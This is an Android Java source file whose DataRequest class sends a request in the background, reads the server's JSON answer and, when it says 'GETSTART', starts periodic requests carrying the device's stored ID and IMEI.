package com.inet.android.request;

import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.bs.Caller;
import com.inet.android.utils.Logging;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

public class DataRequest extends DefaultRequest {
	private final String LOG_TAG = "PeriodicRequest";
	Context ctx;
	
	public DataRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		RequestTask mt = new RequestTask();
		mt.execute(request);
	}
	
	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		try {
			getRequestData(Caller.doMake(request));
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	@Override
	protected void getRequestData(String response) throws JSONException {
		String postRequest = null;
		
		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		postRequest = "{\"id\":\"" + sp.getString("ID", "0000") + "\","
				+ "\"IMEI\":\"" + sp.getString("IMEI", "0000") + "\"}";		
		
		JSONObject jsonObject = new JSONObject(response);
		
		String str = jsonObject.getString("ANSWER");
		if (str.equals("GETSTART")) {
//			sendPeriodicRequest(postRequest);
			PeriodicRequest pr = new PeriodicRequest(ctx);
			pr.sendRequest(postRequest);
		}
	}

}
